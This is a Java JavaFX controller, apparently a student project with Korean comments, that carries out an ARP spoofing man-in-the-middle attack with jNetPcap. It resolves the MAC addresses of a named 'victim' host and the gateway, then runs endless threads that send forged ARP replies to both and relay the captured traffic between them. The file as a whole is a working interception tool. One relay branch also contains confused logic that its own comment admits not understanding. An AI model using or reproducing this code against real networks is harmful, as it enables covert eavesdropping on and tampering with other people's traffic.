package controller;

import java.net.InetAddress;
import java.net.URL;
import java.nio.ByteBuffer;
import java.util.ArrayList;
import java.util.ResourceBundle;

import org.jnetpcap.Pcap;
import org.jnetpcap.PcapHeader;
import org.jnetpcap.PcapIf;
import org.jnetpcap.nio.JBuffer;
import org.jnetpcap.nio.JMemory;
import org.jnetpcap.packet.JRegistry;
import org.jnetpcap.packet.PcapPacket;
import org.jnetpcap.protocol.lan.Ethernet;
import org.jnetpcap.protocol.network.Ip4;

import javafx.application.Platform;
import javafx.collections.FXCollections;
import javafx.collections.ObservableList;
import javafx.fxml.FXML;
import javafx.fxml.Initializable;
import javafx.scene.control.Button;
import javafx.scene.control.ListView;
import javafx.scene.control.TextArea;
import javafx.scene.control.TextField;
import model.ARP;
import model.Util;

//버튼 이벤트를 처리해주는 컨트롤러 역할을 수행
//이니셜라이저를 상속받음
public class Controller implements Initializable {
	
	@FXML
	private ListView<String> networkListView;
	
	@FXML
	private TextArea textArea;
	
	@FXML
	private Button pickButton;
	
	@FXML
	private TextField myIP;
	
	@FXML
	private TextField senderIP;
	
	@FXML
	private TextField targetIP;
	
	@FXML
	private Button getMACButton;
	
	ObservableList<String> networkList = FXCollections.observableArrayList();
	
	//네트워크 장치를 담을 수 있는 배열리스트를 생성함
	private ArrayList<PcapIf> allDevs = null;
	
	@Override
	//초기화 메소드
	public void initialize(URL location, ResourceBundle resources) {
		allDevs = new ArrayList<PcapIf>();
		//에러에 대한 내용을 담음 
		StringBuilder errbuf = new StringBuilder();
		//장치를 찾음
		int r= Pcap.findAllDevs(allDevs, errbuf);
		//장치가 없다면
		if (r==Pcap.NOT_OK || allDevs.isEmpty()) {
			// 텍스트 공간에 오류 문자를 출력
			textArea.appendText("네트워크 장치를 찾을 수 없습니다. \n" + errbuf.toString() + "\n");
			return;
		}
		//맨 아래 텍스트 공간에 문자를 출력해줌
		textArea.appendText("네트워크 장치를 찾았습니다. \n원하시는 장치를 선택해주세요. \n");
		//반복문을 이용해서 모든 장치를 하나씩 방문하면서 장치에 대한 내용을 출력
		for(PcapIf device : allDevs) {
			networkList.add(device.getName() + " " +
		//디바이스에 설명이 존재하면 담아줌, 없다면 설명없음
					((device.getDescription()!=null)? device.getDescription():"설명 없음"));
		}
		//장치를 리스트에 추가해서 사용자에게 보여줌
		networkListView.setItems(networkList);
	}
	
	//버튼 함수, 하나의 장치에 대한 선택을 처리
	public void networkPickAction() {
		//인덱스가 0보다 작다면 리턴시켜줌
		//사용자가 장치를 선택한 순서, 선택을 안한다면 -1을 반환, 했다면 인덱스를 잡음 0부터 1씩 증가
		//즉 아래는 예외처리
		if(networkListView.getSelectionModel().getSelectedIndex()<0) {
			return;
		}
		//화면에서 사용자가 선택한 장치를 가져옴
		Main.device=allDevs.get(networkListView.getSelectionModel().getSelectedIndex());
		//선택이 끝나면 선택을 할 수 없게 함
		networkListView.setDisable(true);
		//버튼 또한 더이상 누를수 없도록 함
		pickButton.setDisable((true));
		
		//네트워크 장비에 대한 정보를 가져옴 TextArea에
		int snaplen = 64* 1024;
		int flags=Pcap.MODE_PROMISCUOUS;
		int timeout=1;
		
		StringBuilder errbuf = new StringBuilder();
		Main.pcap=Pcap.openLive(Main.device.getName(), snaplen, flags, timeout, errbuf);
		
		if (Main.pcap==null) {
			textArea.appendText("네트워크 장치를 열 수 없습니다.\n"+ errbuf.toString()+"\n");
			return;
		}
		textArea.appendText("장치 선택 : "+Main.device.getName()+"\n");
		textArea.appendText("네트워크 장비를 활성화 하였습니다.\n");
	}
	
	public void getMACAction(){ //맥주소를 가져올 수 있도록
		if(!pickButton.isDisable()) { //아직 장치를 선택하지 않았다면 종료
			textArea.appendText("네트워크 장치를 먼저 선택해주세요. \n");
			return;
		}
		
		ARP arp=new ARP(); //ARP 패킷클래스를 객체로 만듬, ARP.java에서 만든 ARP라이브러리를 정의함
		Ethernet eth=new Ethernet(); //Ethernet객체
		PcapHeader header = new PcapHeader(JMemory.POINTER); //Pcap을 이용해서 패킷의 헤더부분만 담음
		JBuffer buf=new JBuffer(JMemory.POINTER);
		ByteBuffer buffer=null;
		
		int id=JRegistry.mapDLTToId(Main.pcap.datalink());
		
		//사용자로부터 입력받은 값으로 MAC주소를 얻음
		try {
			Main.myMAC=Main.device.getHardwareAddress(); //현재 내가 선택한 네트워크의 하드웨어 정보
			Main.myIP=InetAddress.getByName(myIP.getText()).getAddress(); //사용자가 입력한 IP주소
			Main.senderIP=InetAddress.getByName(senderIP.getText()).getAddress(); //피해자 IP주소
			Main.targetIP=InetAddress.getByName(targetIP.getText()).getAddress(); //공유기 IP주소
		} catch (Exception e) {
			textArea.appendText("IP주소가 잘못되었습니다.\n");
			return;
		}
		//수정할 수 없음
		myIP.setDisable(true);
		senderIP.setDisable(true);
		targetIP.setDisable(true);
		getMACButton.setDisable(true);
		
		//공유기의 MAC주소를 얻음
		arp=new ARP();
		arp.makeAPRRequest(Main.myMAC, Main.myIP, Main.targetIP);
		//현재 버퍼의 ARP패킷을 담음
		buffer=ByteBuffer.wrap(arp.getPacket());
		//실제로 패킷을 보냄
		if (Main.pcap.sendPacket(buffer)!=Pcap.OK) {
			System.out.println(Main.pcap.getErr());
		}
		textArea.appendText("타겟에게 ARP Request를 보냈습니다.\n"+
				Util.bytesToString(arp.getPacket())+"\n");
		
		long targetStartTime=System.currentTimeMillis(); //요청을 보낸 이후 시간을 측정
		
		Main.targetMAC=new byte[6]; //변수 초기화
		while (Main.pcap.nextEx(header, buf)!=Pcap.NEXT_EX_NOT_OK) { //패킷을 캡처해서 분석, 패킷을 캡처하는데 오류가 발생하지 않은 경우 계속해서 캡처
			if (System.currentTimeMillis()-targetStartTime>=500) {
				textArea.appendText("타겟이 응답하지 않습니다.\n");
				return;
			}
			PcapPacket packet=new PcapPacket(header, buf); //패킷을 담는 PcapPacket
			packet.scan(id); //id를 이용해 캡처
			byte[] sourceIP=new byte[4]; //바이트 배열 할당, 나에게 보낸 사람의 ip를 확인
			System.arraycopy(packet.getByteArray(0, packet.size()), 28, sourceIP, 0, 4); //실제로 캡처한 데이터에서 길이 만큼 바이트 배열형태로 받아옴
			if (packet.getByte(12)==0x08 && packet.getByte(13)==0x06 // 12번째 바이트가 0x08, 13번째 바이트가 0x06인지 확인, 즉 ARP패킷인지 확인함 20, 21번째로 ARP의 응답패킷임을 확인
					&& packet.getByte(20)==0x00 && packet.getByte(21)==0x02 
					&& Util.bytesToString(sourceIP).equals(Util.bytesToString(Main.targetIP)) //마지막으로 이 패킷을 보낸 ip주소가 타겟의 ip인 것을 확인함
					&& packet.hasHeader(eth)) {//2계층 맥주소를 가지고 있는 패킷인지
				Main.targetMAC=eth.source();
				break;
			} else {
				continue; //얻지 못한경우 계속해서 캡처
			}
		}
		textArea.appendText("타겟 맥 주소: " +
				Util.bytesToString(Main.targetMAC) +"\n");
		
		//센더(피해자) 맥주소얻기
		arp=new ARP();
		arp.makeAPRRequest(Main.myMAC, Main.myIP, Main.senderIP);
		//현재 버퍼의 ARP패킷을 담음
		buffer=ByteBuffer.wrap(arp.getPacket());
		//실제로 패킷을 보냄
		if (Main.pcap.sendPacket(buffer)!=Pcap.OK) {
			System.out.println(Main.pcap.getErr());
		}
		textArea.appendText("센더에게 ARP Request를 보냈습니다.\n"+
				Util.bytesToString(arp.getPacket())+"\n");
		
		long senderStartTime=System.currentTimeMillis(); //요청을 보낸 이후 시간을 측정

		Main.senderMAC=new byte[6]; //변수 초기화
		while (Main.pcap.nextEx(header, buf)!=Pcap.NEXT_EX_NOT_OK) { //패킷을 캡처해서 분석, 패킷을 캡처하는데 오류가 발생하지 않은 경우 계속해서 캡처
			if (System.currentTimeMillis()-senderStartTime>=500) {
				textArea.appendText("센더가 응답하지 않습니다.\n");
				return;
			}
			PcapPacket packet=new PcapPacket(header, buf); //패킷을 담는 PcapPacket
			packet.scan(id); //id를 이용해 캡처
			byte[] sourceIP=new byte[4]; //바이트 배열 할당, 나에게 보낸 사람의 ip를 확인
			System.arraycopy(packet.getByteArray(0, packet.size()), 28, sourceIP, 0, 4); //실제로 캡처한 데이터에서 길이 만큼 바이트 배열형태로 받아옴
			if (packet.getByte(12)==0x08 && packet.getByte(13)==0x06 // 12번째 바이트가 0x08, 13번째 바이트가 0x06인지 확인, 즉 ARP패킷인지 확인함 20, 21번째로 ARP의 응답패킷임을 확인
					&& packet.getByte(20)==0x00 && packet.getByte(21)==0x02 
					&& Util.bytesToString(sourceIP).equals(Util.bytesToString(Main.senderIP)) //마지막으로 이 패킷을 보낸 ip주소가 타겟의 ip인 것을 확인함
					&& packet.hasHeader(eth)) {//2계층 맥주소를 가지고 있는 패킷인지
				Main.senderMAC=eth.source();
				break;
			} else {
				continue; //얻지 못한경우 계속해서 캡처
			}
		}
		textArea.appendText("센더 맥 주소: " +
				Util.bytesToString(Main.senderMAC) +"\n");
		
		//감염된 패킷을 보냄
		new SenderARPSpoofing().start();
		new TargetARPSpoofing().start();
		new ARPRelay().start();
	}
	
	class SenderARPSpoofing extends Thread { //작업을 반복적으로 하는 것이 쓰레드
		@Override
		public void run() { //메인함수
			ARP arp=new ARP();
			arp.makeAPRReply(Main.senderMAC, Main.myMAC, Main.myMAC, //피해자단에서는 공유기의 맥주소가 나의 맥주소가 됨 
					Main.targetIP, Main.senderMAC, Main.senderIP); //피해자컴퓨터에게 '타겟의 아이피의 맥주소는 나의 맥주소이다.'
			Platform.runLater(()-> { //뷰를 갱신
				textArea.appendText("센더에게 감염된 ARP Reply 패킷을 계속해서 전송합니다.");
			});
			while(true) { //계속해서 패킷을 전송할 수 있도록 만듬
				ByteBuffer buffer=ByteBuffer.wrap(arp.getPacket());//전송할 바이트 배열 생성
				Main.pcap.sendPacket(buffer); //패킷 전송
				try {
					Thread.sleep(200); //쓰레드를 0.2초 씩 쉬게함
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		}
	}
	
	class TargetARPSpoofing extends Thread { //작업을 반복적으로 하는 것이 쓰레드
		@Override
		public void run() { //메인함수
			ARP arp=new ARP();
			arp.makeAPRReply(Main.targetMAC, Main.myMAC, Main.myMAC, 
					Main.senderIP, Main.targetMAC, Main.targetIP); 
			Platform.runLater(()-> { //뷰를 갱신
				textArea.appendText("타겟에게 감염된 ARP Reply 패킷을 계속해서 전송합니다.");
			});
			while(true) { //계속해서 패킷을 전송할 수 있도록 만듬
				ByteBuffer buffer=ByteBuffer.wrap(arp.getPacket());//전송할 바이트 배열 생성
				Main.pcap.sendPacket(buffer); //패킷 전송
				try {
					Thread.sleep(200); //쓰레드를 0.2초 씩 쉬게함
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		}
	}
	
	class ARPRelay extends Thread {
		@Override
		public void run() {
			Ip4 ip=new Ip4();
			PcapHeader header=new PcapHeader(JMemory.POINTER);
			JBuffer buffer=new JBuffer(JMemory.POINTER);
			Platform.runLater(()-> { //뷰를 갱신
				textArea.appendText("ARP Realy를 진행합니다.\n");
			});
			
			while(Main.pcap.nextEx(header, buffer)!=Pcap.NEXT_EX_NOT_OK) {
				PcapPacket packet=new PcapPacket(header, buffer);
				int id=JRegistry.mapDLTToId(Main.pcap.datalink());
				packet.scan(id);
				
				byte[] data=packet.getByteArray(0, packet.size()); //실제로 캡처가 된 패킷 자체
				byte[] tempD=new byte[6];
				byte[] tempS=new byte[6];
				
				System.arraycopy(data, 0, tempD, 0, 6);
				System.arraycopy(data, 6, tempS, 0, 6);
				//받은 패킷에서 처음6바이트를 tempD에, 그 다음 6바이트를 tempS에 복사함
				//즉 tempD에는 도착지의 MAC주소, tempS에는 송신지의 MAC주소가 복사됨
				//12개의 바이트를 읽어서 맥주소를 담아줌
				
				//버그 예외 처리라는데 이해안감..
				if(Util.bytesToString(tempD).equals(Util.bytesToString(Main.myMAC)) &&
						Util.bytesToString(tempS).equals(Util.bytesToString(Main.myMAC))) {
					if(packet.hasHeader(ip)) {
						if(Util.bytesToString(tempD).equals(Util.bytesToString(Main.myIP))) {
							System.arraycopy(Main.targetMAC, 0, data, 0, 6);
							ByteBuffer buffer2=ByteBuffer.wrap(data); 
							Main.pcap.sendPacket(buffer2);
						}
					}
				}
				//본격적인 릴레이
				//피해자로부터 오는 패킷을 라우터로 보내줌
				else if(Util.bytesToString(tempD).equals(Util.bytesToString(Main.myMAC)) &&
						Util.bytesToString(tempS).equals(Util.bytesToString(Main.senderMAC))) {
					if(packet.hasHeader(ip)) {
							System.arraycopy(Main.targetMAC, 0, data, 0, 6);
							System.arraycopy(Main.myMAC, 0, data, 6, 6);
							ByteBuffer buffer2=ByteBuffer.wrap(data); 
							Main.pcap.sendPacket(buffer2);
					}
				}
				//라우터로부터 오는 패킷을 피해자로 보내줌
				else if(Util.bytesToString(tempD).equals(Util.bytesToString(Main.myMAC)) &&
						Util.bytesToString(tempS).equals(Util.bytesToString(Main.targetMAC))) {
					if(packet.hasHeader(ip)) {
						if(Util.bytesToString(ip.destination()).equals(Util.bytesToString(Main.senderIP))) {
							System.arraycopy(Main.senderMAC, 0, data, 0, 6);
							System.arraycopy(Main.myMAC, 0, data, 6, 6);
							ByteBuffer buffer2=ByteBuffer.wrap(data); 
							Main.pcap.sendPacket(buffer2);
						}
					}
				}
				System.out.println(Util.bytesToString(buffer.getByteArray(0, buffer.size())));
			}
		}
	}
}
